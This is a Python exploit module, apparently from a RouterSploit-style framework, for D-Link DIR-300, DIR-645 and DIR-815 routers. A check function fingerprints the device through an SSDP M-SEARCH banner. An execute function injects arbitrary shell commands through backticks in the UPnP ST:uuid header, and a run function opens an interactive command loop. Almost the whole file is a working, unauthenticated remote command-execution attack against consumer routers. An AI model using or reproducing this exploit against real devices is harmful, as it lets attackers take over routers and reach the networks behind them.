#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import socket

from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DIR 300 645 815 UPNP Remote Command Execute',
        'description': 'D-Link DIR 300 645 815 UPNP service allow remote command execute',
        'reference': ['https://www.exploit-db.com/exploits/34065/'],
    }

    prompt = 'dir_300_645_815_upnp_rce'

    def __init__(self):
        super().__init__()

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        self.command_loop(host, port, timeout)

    def check(self, host, port, timeout):
        buf = ("M-SEARCH * HTTP/1.1\r\n"
               "Host:239.255.255.250:1900\r\n"
               "ST:upnp:rootdevice\r\n"
               "Man:\"ssdp:discover\"\r\n"
               "MX:2\r\n\r\n")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.send(buf)
            response = sock.recv(65535)
            sock.close()
        except Exception as err:
            return False

        if "Linux, UPnP/1.0, DIR-" in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable

    def execute(self, host, port, timeout, cmd):
        buf = ("M-SEARCH * HTTP/1.1\r\n"
               "Host:239.255.255.250:1900\r\n"
               "ST:uuid:`" + cmd + "`\r\n"
               "Man:\"ssdp:discover\"\r\n"
               "MX:2\r\n\r\n")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.send(buf)
            sock.close()
            return 'Success'
        except socket.error:
            return ''

